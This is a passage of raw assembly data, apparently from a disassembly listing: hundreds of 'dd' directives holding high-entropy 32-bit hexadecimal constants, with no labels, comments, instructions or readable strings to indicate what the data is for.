		dd 0CC3B2708h, 8ACA229Fh, 9E065889h, 82A1A4AFh,	0EB20010Fh
		dd 71BB52F1h, 7B81FB75h, 65216409h, 0CD525B96h,	5F867C9Ah
		dd 0FDE69430h, 9A590515h, 749DAB0h, 85BB3FF5h, 0D5ED7F1h
		dd 0BC79FC1Eh, 9B88A6C1h, 9A946825h, 7093A8AEh,	9CC6D0A5h
		dd 0B3C2BC51h, 114DD303h, 3A2959EFh, 0C69DF801h, 1996BC7Dh
		dd 4B664B13h, 0E555F93Fh, 0C139009Fh, 0C3CA646Fh, 0A42C34A1h
		dd 9C395FA7h, 0D328692Ch, 72D12D9Eh, 0FEE96F31h, 90C17D8Fh
		dd 110F62B2h, 0ACF1B102h, 832F2A91h, 0C39346D1h, 1FBB2E64h
		dd 503AA407h, 3A0818C4h, 38B24294h, 198FF5A9h, 0EBCE49FAh
		dd 41930278h, 94DDA3B3h, 0A9D451F8h, 0FB58683Fh, 0F68A8658h
		dd 0DB47095Ch, 0ACAC03A7h, 7EE996FFh, 9340EF3h,	0D25D6C0Ch
		dd 252FCEA6h, 0DCC9BC25h
		dd 2C7EC554h, 13FF935Dh, 4789FE15h, 4B54828h, 0EA4E8341h
		dd 0C3C3789h, 0DE817C3Ch, 0BBCFE7ADh, 0C94E8742h, 27F28018h
		dd 18561CF5h, 3539E4ECh, 0B8D74D80h, 0BF982554h, 9FD5A489h
		dd 1B0FBF4Eh, 0D5415D2h, 56C15664h, 0AF471C2Ah,	0A02FF34Ch
		dd 0F06543F0h, 57BE7F74h, 8269580Ah, 0B5759599h, 4D09EC49h
		dd 73D91ECAh, 0AF7D4CCAh, 0F5591442h, 78E59A85h, 7BB9CAE7h
		dd 4EE55648h, 912605F1h, 0FDA700E9h, 4C7476ACh,	0C680C4F0h
		dd 87DC4EDFh, 2DD6CAADh, 0FDDA097Ch, 80CD0EB2h,	5A3C2718h
		dd 436E56ECh, 0D93D6942h, 5F101B50h, 0F0978CEFh, 0F1716BE4h
		dd 0CB0CBF90h, 0B505B66Eh, 0C7ECC350h, 7C4F7636h, 729A5353h
		dd 225B7A6Ah, 739B3598h, 0F8CC9F71h, 2E8D999Ch,	62BC905Fh
		dd 7F7A4B2Dh, 0CBDA45EDh, 0CEC2C500h, 0D8E6D930h, 54D7664Dh
		dd 0F16828D4h, 0DE94449Bh, 0CB0B7Bh, 45E8C034h,	8CE112BEh
		dd 252A0EEAh, 4BE442B6h, 963E9CA0h, 0A1FE9454h,	0FC102547h
		dd 7CC83E96h, 96DCC35Ah, 0B460D6C4h, 901A016Eh,	0CC6DA0ECh
		dd 0AF156161h, 1B095615h, 86E1DAB9h, 0CB32669Eh, 411FD45h
		dd 3C8C3E21h, 0B142B1B1h, 992ED480h, 78DDA3A6h,	0D10CBB60h
		dd 77B0EE07h, 11C6296Dh, 1DD2AB3Dh, 6E120766h, 6CDA2301h
		dd 0D7A80FD1h, 0CD7F515Eh, 74419047h, 0BEFBE77Ch, 3B920AA6h
		dd 211DB232h, 32A067BBh, 6C48468Ah, 47C2CC8Bh, 0B68633E6h
		dd 0A31D0A57h, 46C0A022h, 6DA8A7D0h, 5E94422h, 76F9D1D9h
		dd 0BCDAC8ABh, 0E901B32Ch, 7EBE505h, 24834E49h,	1D9EBA4Dh
		dd 0D4BAFF62h, 88438CA4h, 919BA486h, 0AF9DE00h,	91190F95h
		dd 77D80458h, 957C6292h, 61743CAFh, 24FE3CC9h, 882A0AF0h
		dd 86C05461h, 9D5346A9h, 1A9E348Fh, 34085EE9h, 28B6CCC0h
		dd 0EE286CE6h, 1CD1178Ch, 4C4633DEh, 782F2AA5h,	521DEA9Ah
		dd 0BD2C1454h, 0AE681189h, 7A7BB2CDh, 6A18CE11h, 4784D531h
		dd 6AA370CFh, 74534598h, 468A8F14h, 6089D4A0h, 369C2C37h
		dd 754725CCh, 2F5F72D1h, 0AC4414E4h, 5DA8D74Fh,	8C1D2EB7h
		dd 0AC159D40h, 79934262h, 0C20F2501h, 0E8562F0h, 0E138E6B9h
		dd 84A37C79h, 0D3768BB8h, 81E0D466h, 0AE0384B3h, 0CE3C8C15h
		dd 24EA5996h, 4A4C330Fh, 7D2B34A1h, 3328A5D3h, 0A1FD3771h
		dd 0B446BFD9h, 2C18059Eh, 97E53D1Ah, 0D9D280E5h, 3C783648h
		dd 0F227426Ch, 24BD918Dh, 63F6F57Fh, 40072725h,	6C60ABCDh
		dd 0C4FE9F7Eh, 53404CCDh, 0E56F1314h, 4255CA49h, 88ADA157h
		dd 0CE217977h, 1AFA88BDh, 89E8C835h, 0B5001E63h, 57872DCBh
		dd 0DCEE2319h, 0E459D4EFh, 0CD965BD1h, 8B9C2091h, 0D5550905h
		dd 0FA22AC6Ah, 0DA560473h, 93811716h, 3D5A1183h, 0F85DEE79h
		dd 0F5BE6C9Bh, 26101AF7h, 5A7B0BC1h, 0FCA63855h, 7C54AACFh
		dd 6A25114Ch, 1FC066F2h, 25F4748h, 1F8E8ACAh, 0FB051049h
		dd 35305111h, 43C50573h, 0C815A23Bh, 0DCC7855Ah, 0C6C77EBBh
		dd 0E46D017Dh, 0A8E19921h, 507728B3h, 7B1E6D63h, 0F72F3DDAh
		dd 0C66B6ABEh, 6BB275A7h, 437E95CEh, 1EFF4F45h,	5DB38304h
		dd 3CA02B64h, 0AF744E2h, 0D0532541h, 630A1552h,	0C8681B1Ch
		dd 0B3DECCCEh, 51C5CCABh, 484A28B0h, 85A8EFEEh,	0A8E533E0h
		dd 7E67D3E3h, 3FDC4DA5h, 0D93AC51Bh, 71D7A157h,	73FB7D7Dh
		dd 947F54E8h, 93E5ABC4h, 9399579Fh, 0DC52C019h,	0DE5EADE7h
		dd 4074F032h, 99FEA7BDh, 3075580Eh, 97E3AC93h, 0A9C16862h
		dd 105C7582h, 0CF19F094h, 0DD416D71h, 0F5C45FB2h, 3675D2E7h
		dd 1D4B61FFh, 2B1F1F7Ch, 2D9CA1EAh, 0A126AC29h,	4779B492h
		dd 95BA3A22h, 1775E192h, 0E5287997h, 697788ABh,	0CAC59761h
		dd 45975086h, 255144A5h, 6E9F140Eh, 0F7C0248Ch,	77FF8E9Fh
		dd 4445102Ah, 0E88EDFD5h, 257454A7h, 0AF907F5Fh, 5FCF8D11h
		dd 89BEA70Ch, 0DA1FB5E6h, 9F4A65EAh, 41FB2BD3h,	945C244Bh
		dd 1A165028h, 0C0F3ED81h, 0FFFB930Ah, 0E3610790h, 0FFF1FCDCh
		dd 7B90E336h, 0D5BC844Bh, 0E9395D10h, 8A54DC1Eh, 8BA0D2D4h
		dd 0BF13BA1h, 6AD0D711h, 0A70E74E4h, 0A39CEF3Ch, 9208941h
		dd 578B59A5h, 0C9E67766h, 52FF8615h, 0FFF445Bh,	28CABEC0h
		dd 0F5EB015Fh, 0EB4C3A10h, 0E6D4B483h, 187D3721h, 88FF7957h
		dd 175104F0h, 0E702EE0h, 27088B1Eh, 0D96861DFh,	40A85117h
		dd 7408766Bh, 67EDA25Dh, 0ABB64E79h, 365F5C28h,	639E2F19h
		dd 15DAB6DCh, 5527457Fh, 0B06A6F6h, 0E902211Ch,	248B8295h
		dd 7EB1D192h, 6C5CD847h, 0E61ACDF0h, 2AC59447h,	4770DA93h
		dd 0C14D514Dh, 9548A3FCh, 1354AA37h, 28A52C21h,	0FA6848F1h
		dd 7DA7BEDBh, 0E9832AE3h, 0F82540C5h, 754FA491h, 224138B3h
		dd 484A425h, 2EE02E08h,	0B7C2DE62h, 0B08D30C4h,	1B5DBE2Eh
		dd 5576F4D6h, 0D7D790BCh, 3DF1ED05h, 0BE5B4C5Fh, 81A5A299h
		dd 0BA917516h, 75270218h, 4A389F8Fh, 534946B0h,	0CBCA60DEh
		dd 0F5ECA5D7h, 2042E7DEh, 3FFA4E2Bh, 3A22F300h,	7E131FFDh
		dd 0ABCE3745h, 0A819A07Bh, 889A2FB7h, 7DD8036Bh, 0E391DBCh
		dd 259E2007h, 29DDA84h,	1D061654h, 7EB4CE52h, 96B6EC80h
		dd 3F794CB9h, 83AC77C7h, 16DCF8E0h, 0CE6123BAh,	0C2FB17B4h
		dd 0B4821BD0h, 9D0EF7D8h, 93AE3172h, 44FFD7A4h,	0EFC4BE0Eh
		dd 9555A352h, 654DD7ACh, 3F2BC88Ch, 0BD804A05h,	0B2CF3394h
		dd 6081DF65h, 0FEB37915h, 1B55CE37h, 0CB3CD6B5h, 7E779495h
		dd 79040197h, 0BD46333Ch, 64BBA7D0h, 9A8F7599h,	20D039A0h
		dd 31D9069Bh, 0D1E267Bh, 74B27BD7h, 0BFF8F320h,	30F7F1BCh
		dd 0B4CDFCADh, 7EC1DF29h, 497058C9h, 0E0324B39h, 0B7634F80h
		dd 0BBC0E832h, 26A4A5B8h, 72723164h, 1DD947C6h,	5465EE2Ch
		dd 270C65DCh, 6BF9E798h, 0E16FC2F5h, 7F5772D3h,	84D92961h
		dd 28007085h, 519E3CECh, 2E418B82h, 0B4CB873Fh,	1755B065h
		dd 54C8D035h, 98C47BBBh, 4A7C7762h, 0EE799201h,	0BC22529Ah
		dd 5964F6E8h, 51E8CB4Ah, 4A1554A8h, 91D18AFAh, 0BA711345h
		dd 0C516FFCEh, 1C219B77h, 51DDC1E8h, 0E2578968h, 0BDABF581h
		dd 82966C26h, 67B34E47h, 78F7EE10h, 75B4F8ABh, 3B5706EDh
		dd 115FAC53h, 21C14C5Dh, 0EE23C824h, 87D936C5h,	23EE831Ch
		dd 0A921B0C2h, 0FB35881Ch, 0D34A2484h, 0A2DA88ADh, 88A63915h
		dd 441C5248h, 7A8AE82Eh, 0C202CED7h, 893A4D75h,	277734F4h
		dd 4547DFCFh, 0A9961815h, 1E489836h, 50470BA0h,	466D458Fh
		dd 83B10862h, 0DDCA0DE3h, 4CCEDCC3h, 0D5347369h, 0CE3D2BEBh
		dd 8D1DC6E9h, 1974BA1Dh, 8B541A6h, 502DFEB5h, 359BEDE2h
		dd 0D22F1AB6h, 0B4A1A086h, 895BC4A5h, 94039843h, 3B6AF6E7h
		dd 4AF5F815h, 6E3661DEh, 14B11248h, 98CD1CC2h, 4ED24CC7h
		dd 54AD7CD4h, 6FEA429h,	149ED5A2h, 797D7686h, 0D9280AC0h
		dd 80B177AAh, 0FBF1AEA9h, 0D8541684h, 0A3787C0Dh, 9BE8155Ch
		dd 2FFBF807h, 0C5B99DAh, 59BDCE13h, 0F2B1FBBBh,	0D6B9D64Ah
		dd 0CF40FA17h, 7BB98502h, 5FC9D94Ch, 0CCC8B76Fh, 3EABEA67h
		dd 351A6E05h, 0DAD301B3h, 3C088CEFh, 37626D00h,	0A803207Eh
		dd 0AC3FDDA9h, 0D9EB6183h, 8095345Ah, 0DB661CAFh, 0C4C1E4BFh
		dd 596A93DCh, 1E9AEEC5h, 510A4BF3h, 0B0012EC4h,	718774F7h
		dd 0BD48838Dh, 4CA69314h, 5EE55F50h, 5D46455Ch,	5D6920D5h
		dd 5BA792ADh, 66158967h, 0E312C949h, 0FBD08EB6h, 0E0C2169Eh
		dd 8DCB5F5Fh, 36F04BE9h
		dd 0E9C7B334h, 0BDC3035Eh, 1C18BBDFh, 4F7F1825h, 0D6A32609h
		dd 49E7277Bh, 0B0F40139h, 0ABAB80C6h, 0D134BFC7h, 616079D2h
		dd 11563BAh, 81A0D27h, 0F8E4BA5Ch, 2CA70D6Ch, 6F320EB0h
		dd 1D7A39ECh, 0ADE7028h, 5D3A780Eh, 272E93ABh, 9658BF4h
		dd 89905DC5h, 0D23D5857h, 84AA4B6Dh, 0EDB4EBCh,	0F27DF56h
		dd 8A08E097h, 7707850Dh, 9D1CF8A5h, 5781AA93h, 889031B5h
		dd 2102EB91h, 0DE563318h, 3BEEA5EBh, 0E9207F62h, 0CCB27818h
		dd 48EDB8E8h, 0F1E960ECh, 30D22CA5h, 6283A8B3h,	9E5984F8h
		dd 2B8FE5F6h, 0AC413F70h, 70AD2B56h, 0AF990541h, 53166BFAh
		dd 0E6EF7CB4h, 44CCEDBCh, 0F62C63E6h, 60F8186Fh, 75985605h
		dd 0D9672A2h, 29E479FAh, 417217F5h, 0FDD3DA18h,	0FC8E27C8h
		dd 595A3082h, 1C4CF511h, 0A25B8A02h, 7F4BC3F4h,	0A0CDE321h
		dd 271600D4h, 0FF2AF59Ah, 43268EC9h, 55A35AB5h,	22C3A187h
		dd 896DA5FBh, 0C2EEBF98h, 0AB4404BEh, 0A735B8A1h, 29B1D05Ah
		dd 0FF9D7E93h, 877E81EBh, 0ECF34B41h, 9AC44784h, 0BC1594A6h
		dd 4E5B3FB7h, 86AA3B5Ah, 933C3217h, 380822D7h, 23B74B57h
		dd 9D4E9AC6h, 75AA4462h, 0CF70F6CAh, 1CB0D756h,	3C19EDA8h
		dd 0FE74DAD8h, 8EB06913h, 45444BD6h, 0E5D0ECCBh, 0F95A3D9Ch
		dd 0EF0466F3h, 4F20395Ch, 0A149802Fh, 0A4B6C305h, 522C8895h
		dd 17409F28h, 0EF81E016h, 0BA5F59Fh, 0CD753B7Ah, 0CAE8E34Bh
		dd 14F96BE8h, 9901AEAEh, 19DC9BF0h, 0DF19DB1Fh,	112D307Ah
		dd 83D68CA9h, 775BF885h, 90590E41h, 4F4BE039h, 812E4063h
		dd 0BBA6310Bh, 0C349001Bh, 4995D75Eh, 0AD7983A9h, 0A5F1BCBh
		dd 169D8C6Bh, 95D420B9h, 22708C07h, 0B0D3607Dh,	59823588h
		dd 0D162CC17h, 535D1122h, 69C7B61Bh, 0F4917E89h, 0A277BCA6h
		dd 0DAF9C958h, 658B1E1Fh, 3CFF49A8h, 1CAD0B27h,	1197F054h
		dd 0BF45D539h, 60D9B4CCh, 0C54E6F38h, 3FF3E1A8h, 404F004Dh
		dd 5D6853C5h, 0F829E999h, 125D2F14h, 504ABB99h,	0D9C40BDFh
		dd 0C264E78Eh, 5F03D139h, 90ED60A9h, 0B8F45C29h, 30AAAEC2h
		dd 9AE1D199h, 195FCC8Eh, 0BA4F060h, 4CBCCC28h, 0CADA5752h
		dd 0B38FC2CEh, 7E41131Dh, 0B08910Eh, 0BEA4A2B5h, 984CE6FAh
		dd 0BC41A041h, 387FB01Dh, 6807F6F6h, 8E8990E1h,	1AC3F0A0h
		dd 16A3208Ah, 2DA9654h,	2E1C7631h, 89136129h, 3AD1F726h
		dd 6E4B28B2h, 0D08D7B91h, 91D162Bh, 0B550A672h,	3FE7CDC4h
		dd 0D5A053D9h, 6E892E1Bh, 0CFEBED19h, 0C048E5Ch, 0C3956E14h
		dd 9E7E8B47h, 7E4F42B6h, 7B92BDA9h, 0E4EF7D7Dh,	0BF856E08h
		dd 0F71CC47Ch, 0ACA24EBAh, 0AA7FC4C2h, 0CE5E20DCh, 7F481A48h
		dd 0F640A5Eh, 557F6B67h, 93E451EDh, 18A9D1BDh, 0C048B740h
		dd 2E1E45F7h, 94334039h, 0A1C7EA4Bh, 50C32A17h,	0F602A7EAh
		dd 0C07855D1h, 16612D8Ah, 15F8A56Ah, 6F14AFC9h,	5A7DF59Ah
		dd 28A098DAh, 0E89C500Dh, 447504A9h, 326D51E0h,	0CCF4A991h
		dd 0CD9456Fh, 57E74E4Fh, 8E1F1040h, 49930927h, 8B6BD1B7h
		dd 766BD0E3h, 0FDBFE394h, 59B32763h, 294A12CBh,	0ADA98517h
		dd 894CD864h, 6C153EE2h, 1ED6DE6Ch, 0A8B62B67h,	1BECFF38h
		dd 0E223BCD6h, 0A57965AEh, 43DF3E1Dh, 5EA1B62Dh, 64B181CEh
		dd 3B9D32E0h, 0D80D6C4Bh, 64EACE1Dh, 6C3B001h, 266AE558h
		dd 81086200h, 148B84D6h, 84E30E9h, 23AFD3A2h, 0E0F06FB1h
		dd 0ED78CE2Bh, 96075809h, 0C53458B8h, 82E0ABEEh, 0FBEA760Dh
		dd 7D0999B9h, 5F9CBCA0h, 375EC24Fh, 1DF69BB4h, 0DEF31910h
		dd 0FB836656h, 0A01A526Eh, 24BB8C47h, 0C1643E9Ch, 883DE84Dh
		dd 26A1FEF1h, 0CF7E47B6h, 0B9375492h, 0DFA16557h, 29EAA89Bh
		dd 0B18C2E61h, 332A1A2h, 0CB8096CFh, 8F3C3B92h,	0CAA7D501h
		dd 477274E7h, 0A11750CEh, 2CED1B64h, 2378ADD4h,	5D60B6F1h
		dd 344ED058h, 9B3CB30Fh, 646A5D1Bh, 6BD33362h, 0BD043660h
		dd 4B1A558Dh, 0B23BAC2Bh, 1BE8131Ah, 0FA757411h, 7CA3CD2Bh
		dd 853C048Eh, 2D6294B6h, 813F70ADh, 0C27F9411h,	896E855Ah
		dd 32C3F8ECh, 661F6095h, 0CE1C1A18h, 0B67C9026h, 15263944h
		dd 1B382538h, 674C2098h, 37F89E41h, 2D404968h, 9FF03152h
		dd 0BA719BADh, 0AC778921h, 0C17D8E73h, 6CDC09B7h, 4155635Ah
		dd 0DA7F3D39h, 0B6689F46h, 0E8C6EBC5h, 9F8A4C19h, 3D44B9DBh
		dd 0C6DC9C9Ch, 0B4D3D320h, 0A5492031h, 5C8CFD3Ch, 6B162FBAh
		dd 542A950Bh, 0FF75214Ch, 0EC6FAA57h, 4F60AD3Ah, 0A6398D3Ah
		dd 0F8739D2Dh, 0A0F73A59h, 3EDC9A76h, 9E1D53DEh, 43340AD1h
		dd 0FC37F770h, 50A152A2h, 0C3A6AE95h, 0C6193D3Bh, 0E8C61B1Eh
		dd 7A88D480h, 1C52E567h, 0C9B712BCh, 0F42F7E96h, 3C951784h
		dd 2FC7AD23h, 65626B01h, 0A5B4A231h, 0A627EB1Dh, 643CEC8h
		dd 4E6095D3h, 0CB0192BFh, 0B276003Fh, 57B26E48h, 0D8A572FDh
		dd 7D520CEEh, 40EB588Ah, 784155h, 0C159D7FAh, 3F41BCB1h
		dd 95BDF27h, 337C2413h,	1A45F53Ah, 44FE1F98h, 3754273Dh
		dd 0AE951361h, 0C2B6CAA0h, 3A890E68h, 56F67B9Ch, 5A952A08h
		dd 0AE6F842Dh, 42860883h, 0C577A88Dh, 66390979h, 208B8690h
		dd 7057BE7Dh, 0DBAFB61Fh, 46748973h, 0BEBC9D75h, 8DF490ADh
		dd 420E8030h, 8C9C1E0h,	12EA04CCh, 0AA79F1F2h, 7588C995h
		dd 74BBA827h, 0AA29FDF0h, 8D73D00h, 1A13C551h, 5710F501h
		dd 0A2225CC9h, 0CFEB3A8Bh, 613C639Bh, 8B9955B2h, 73EC7E12h
		dd 51C9B8D2h, 0AAC07CF4h, 95DA301Ch, 0AF2A0E65h, 0E15674EEh
		dd 0A0039353h, 464812Ah, 0FCA09739h, 400D48BCh,	1B676913h
		dd 0FC4C722Ch, 0BED0FD77h, 0ED093BE7h, 8CE18C23h, 0E0217390h
		dd 52269D19h, 49639EE5h, 3C320F2Fh, 502F4B13h, 0F5C42926h
		dd 4C3639AEh, 0D2BC0216h, 0BB7EE90Bh, 4E93AB1Ch, 0E2387FCEh
		dd 2813C22h, 66D8A118h,	9B21BFACh, 133128E4h, 0CA4A5AD6h
		dd 0DCF0E89h, 712FB8D7h, 0B49F432h, 6C0ED54Bh, 0A1E4AE8Ah
		dd 0E03DFDA6h, 0BC007443h, 2BEC9EC2h, 0E5FC5AFAh, 0E59D8C1Eh
		dd 47C8C496h, 1D074704h, 0AA63654Fh, 305C7729h,	63C58837h
		dd 71AB46EDh, 0E0CDA463h, 9164BF4Bh, 126D9EE2h,	521E1C5Fh
		dd 626D0584h, 0E6B1F6D0h, 0A2AB1817h, 9E7EAB0Fh, 41B5CB99h
		dd 1166F619h, 0E8943015h, 0A1225E12h, 33835CFDh, 6EE0998Eh
		dd 7DB1111Eh, 0F5288C1h, 3648A921h, 8EA9DA37h, 0B0420FFAh
		dd 7DC146Ah, 875A7D28h,	1B7A0C93h, 0A95937EEh, 143A1FF0h
		dd 6BCDB0BFh, 7EAE3E03h, 971A553Ch, 0A8FE7C17h,	6AC817BFh
		dd 0C71FC2DAh, 80C25C86h, 12411925h, 369D7D31h,	5E3D2C2Fh
		dd 7D90535h, 7D33E7D6h,	40251C84h, 1D2F6647h, 2096297Ch
		dd 0C491B56Ch, 3CA6D428h, 60DC1221h, 473B5FFAh,	0B9D1AD00h
		dd 0A856946Ah, 0E4BCEF18h, 0B2EB946h, 6890ACABh, 0DD7C5342h
		dd 11D175C7h, 8B593D61h, 0EF9DAFC6h, 97989438h,	2DB46702h
		dd 27B100CEh, 3D63240Bh, 67B98BEh, 0BA67368Eh, 60BD0FC1h
		dd 967A49C0h, 5E54C02h,	9569748Eh, 0A585A46Dh, 799950A8h
		dd 6997B3A5h, 48A40521h, 6663794Dh, 78561FAFh, 6671C8F7h
		dd 0B2CC7042h, 571F42CFh, 0B06DF092h, 4020C105h, 653CDA55h
		dd 0CF0C6306h, 5986E122h, 3BC8965h, 0B8C36663h,	48396291h
		dd 0F1E39E0h, 1565819Ah, 0BD977E73h, 246027A3h,	0F56ABFA9h
		dd 0D198F581h, 6A4750BAh, 846CC05Dh, 64EE4CBBh,	8FCF6614h
		dd 13ED3891h, 15744A0Ch
		dd 0B21B94A8h, 11C255E6h, 0B97A7DB3h, 3968F24Ch, 0B7CF2434h
		dd 7EB54EEAh, 0ED65C4A9h, 7809F2C9h, 1710F1BFh,	5F8FD931h
		dd 41815780h, 98316B17h, 0A706059Ah, 0BB6E9450h, 90EDD583h
		dd 0F0452B14h, 0EB01ADF8h, 5B3992BDh, 27CAC6FDh, 0BE80AC5Ah
		dd 506DADAAh, 2815CA3Ah, 18457950h, 77FD8CB2h, 77263F9Fh
		dd 0B34F231Fh, 0B580AA8h, 5872B0A5h, 0DFF6D2DCh, 0BA4094B0h
		dd 0A10538A4h, 0A9D92B5Eh, 0DDB193F4h, 70F8C592h, 0E891C606h
		dd 8989F114h, 7DE4F6B9h, 0D9BB713Ah, 721F729h, 6AD1BD8Ah
		dd 0FBB8701h, 0FAFEB188h, 2E3E7C12h, 8F825136h,	1452C40Fh
		dd 0C2630A35h, 91B5E78Bh, 4A5A6CBh, 0A68A88B8h,	0A3C0D9A2h
		dd 0B03CF415h, 22798460h, 0B1C2CFDh, 29CC39F8h,	70CD1BD7h
		dd 53256431h, 5CF7184Eh, 0EF8FB4F1h, 0BD6BB2CAh, 5A5F164h
		dd 2755096Fh, 9A73C3E4h, 0E90C2AB9h, 32F1EC27h,	766887E8h
		dd 3EAF612h, 8AAD6CE2h,	0DE101330h, 8F3495C9h, 400EC01Dh
		dd 0AB205AAFh, 675A99B4h, 0D9415009h, 0FFB1B849h, 0F8131241h
		dd 0B316978Ah, 2280F322h, 0D72CAA05h, 0F737C7F3h, 0BDEA5805h
		dd 683F7F7Bh, 0ABA1465Eh, 8ED13091h, 92297C7Bh,	84B2E6DEh
		dd 0CF584C7h, 0CD333373h, 9E181A26h, 45011D21h,	9DABA581h
		dd 417AF86Dh, 0AA0D9B34h, 0DA93B30Eh, 0BCDB185Ch, 0E0337199h
		dd 8D79F732h, 276BE7ACh, 60498E28h, 4A4D3957h, 1E6DDE7Dh
		dd 174BF2A5h, 26F894E8h, 0CA4A1AE2h, 3C8696E5h,	3BFAD2A8h
		dd 5A28FF54h, 678E9BB6h, 0C94DAA8Ah, 44DB40D1h,	0A4602A51h
		dd 26603F30h, 0F295465Eh, 0EE770165h, 7F30B9EAh, 11F9FB4h
		dd 48903916h, 0F684780Eh, 0EEA4AA46h, 1F0FBDA0h, 6E0F5A1Dh
		dd 4A0AB619h, 4BAB7A71h, 94E719C0h, 0AFCC47Eh, 0EBCDA6FCh
		dd 6AF0D7A4h, 6992A658h, 7AED82F7h, 0EAE9105Bh,	114116A7h
		dd 1B0151C7h, 5F2DA1ECh, 67F25D64h, 0EEC750CCh,	0E056A4F6h
		dd 0D0408775h, 0BB2D178Bh, 71796F56h, 0F7078A00h, 0A4A8C685h
		dd 0EC46557Eh, 0AC408312h, 41E81199h, 527BB566h, 0AA4AB4DFh
		dd 0EC906545h, 7518A4C1h, 0CBE9C3D0h, 0FD40333Bh, 37ED5D61h
		dd 9BAA6B5Eh, 56D61321h, 0FB1991A3h, 56813Ah, 50389855h
		dd 5CC3A77Dh, 0E0AB091Fh, 203E67B0h, 29101174h,	627158BFh
		dd 2ED49E88h, 564F8A99h, 0B280C529h, 744CE7CEh,	246598EAh
		dd 1518EBCEh, 0CB223A37h, 0D2E75C3Dh, 0FDF4856Eh, 8067CC44h
		dd 0A6A4E8C7h, 0E6FE822Ch, 0C36FD014h, 70303AFBh, 0BBEFE9FEh
		dd 0E32817CDh, 0CF7905B3h, 0AF47572Bh, 6F7D0E3Fh, 348DD4AEh
		dd 53EE63FDh, 57D5448Fh, 0DC53E5C5h, 0E33DC99Bh, 0A32F9A4h
		dd 5D4B4580h, 54BD1FE4h, 725AE620h, 0B8C7E638h,	0B40DEC6Ch
		dd 55D5C1A7h, 31B4CCA9h, 4CB6B43Fh, 0A02A91C0h,	4C84F467h
		dd 2C985A03h, 0D5F51FA6h, 2BF04252h, 3A842B7h, 0FC88BBD3h
		dd 0A0BCAD74h, 258C4CE2h, 73F07856h, 0D07AB9BFh, 0A6C07323h
		dd 7B579D51h, 3AA69585h, 7C64DD1Bh, 624D3061h, 5EB18035h
		dd 3A466244h, 5E16892Fh, 83752B8Fh, 8CD0E584h, 9B32EF07h
		dd 54A3C805h, 6FF5BFF6h, 55A4F548h, 27D28CD8h, 0AFEEFEE0h
		dd 0DC403357h, 0F99144AEh, 49D7A1F6h, 24650E91h, 8730426Fh
		dd 0B32ABB2h, 87B70E6h,	0F15EE16Ah, 0A7CD4E8h, 6DEDFAE6h
		dd 50F3D655h, 5E504F43h, 0D21374E5h, 963A4FB9h,	9ACB73BBh
		dd 5D58F508h, 0A3219EF9h, 0DA7D2C70h, 7E779773h, 68310989h
		dd 2B54F362h, 2498ADDEh, 0C8937BFDh, 455F4602h,	60E6F110h
		dd 952AEA2Ah, 83F7EF02h, 15A0670Eh, 3863A271h, 59EA1EFDh
		dd 583E3DE0h, 70D3D1DBh, 5183C3FBh, 9B0CAF64h, 562AAF81h
		dd 77CDB7FCh, 0AFBBF2ECh, 5496264Eh, 0F194332Eh, 2D7DC721h
		dd 784F21A8h, 0BB3E7F4Fh, 4487CA68h, 260EA0CBh,	4129CD65h
		dd 0CC824B04h, 3B4AF6BFh, 0F3CA25BDh, 473119D0h, 15CD294Fh
		dd 23F55367h, 73306C51h, 0F86FA226h, 0D40DF5EEh, 0A029A237h
		dd 5E602A5Bh, 815F6620h, 92AD2BD5h, 630C4906h, 77591B61h
		dd 504D2635h, 8E8782E1h, 82181E56h, 99C4F56Bh, 0B00C39C4h
		dd 7D866D1Ah, 0BED8BBE5h, 0D932BA95h, 3A58AF17h, 74BB24A4h
		dd 4EF386C8h, 0CE5D653Dh, 0A44BEB8Ch, 9085E5D7h, 0AEDC53CAh
		dd 8AE2C642h, 0CA973DB6h, 38643E72h, 776FC6Eh, 6FF7B0BCh
		dd 0C15BC64Dh, 86CF3842h, 507E5340h, 0EB9D806Eh, 761D514h
		dd 39E3EBh, 0A583594h, 5FE9B289h, 176A9B54h, 0F20BD8ECh
		dd 63D86223h, 0B3BB18B7h, 7D3645A7h, 60E2FE01h,	0BCFBDE7Fh
		dd 6D108B48h, 187085F1h, 499007C5h, 7CED5E0Ch, 0A5F142DDh
		dd 0EF80CE36h, 0D0CAF81Ah, 8A60B466h, 0CD5AEC3Fh, 0D241E13Dh
		dd 32BAFF8Ch, 0A032FCB0h, 1EF1EFA4h, 8E683D2Ch,	0D4235862h
		dd 8C1FEC9h, 4E62DB2h, 6A582C94h, 810D44A1h, 194E70BFh
		dd 7AB6B23Bh, 0C86BCDA0h, 0AA87335h, 90995F84h,	596439DAh
		dd 0AD621E55h, 0B7BC68C1h, 0D747ABE3h, 3917FCB3h, 6CE7AB4Ch
		dd 805C7826h, 0EFAD3A73h, 0F0094DD9h, 1E48033Fh, 0A388CCEFh
		dd 709B022Bh, 85E87A35h, 5465B884h, 74CAE610h, 97D32541h
		dd 0A8D26493h, 7E9E1CA4h, 0B8A0B7CFh, 48C2F18h,	0D1A89F64h
		dd 3C641EB1h, 0D49467E0h, 0CFC3C77Eh, 8432F494h, 96E294CBh
		dd 0B8EE4B65h, 0A84B9BC7h, 345A7351h, 4B079B7Dh, 84C4D13Dh
		dd 248E7BFCh, 539DD449h, 0EDECB54Fh, 11D41Ch, 0AA6C07FCh
		dd 6D6116A4h, 18ABBC46h, 8DBDFD96h, 0D50375ADh,	811F0312h
		dd 0D0CB116Ch, 75406E56h, 0E6C3A4ABh, 5831851Ch, 6D43A4F5h
		dd 0C9485A52h, 0A7673635h, 47869C45h, 0FF8F83F3h, 2429FF34h
		dd 39AE97F9h, 60AEF813h, 62174817h, 7408EAB8h, 4D8DB6C7h
		dd 27925CE0h, 5E6C1AFCh, 1CC3E351h, 983A025Ch, 0D4145132h
		dd 1C2E34B6h, 4D5AE07Fh, 0BCBEB34Dh, 8E21FDE9h,	9EF40F07h
		dd 3466D374h, 6052E059h, 6B19F342h, 0E0E8429Ah,	0C4D7C2D6h
		dd 0D0F5F0D8h, 0F5573E4Bh, 27437D71h, 0D2BB7B37h, 5CE47A3h
		dd 63A43852h, 0EA7D78D0h, 76839F04h, 0CD528448h, 5DFBEAEh
		dd 0DC7093F6h, 4CA5C5E6h, 74DC21BEh, 2CEC8E38h,	997C3BDEh
		dd 0E5443FDAh, 8F4484ECh, 0DC27D6C7h, 1A2B464Ch, 0D828B939h
		dd 173C1CAAh, 79559C8Dh, 0C11DDEBh, 0E340CC90h,	60DC9B0Bh
		dd 5B7971A1h, 0A0A29A89h, 44BDACA5h, 0C628E919h, 15CC621Fh
		dd 1518F2DBh, 0B4CD6235h, 525B726Bh, 0FAFE7BE0h, 0AF6AB477h
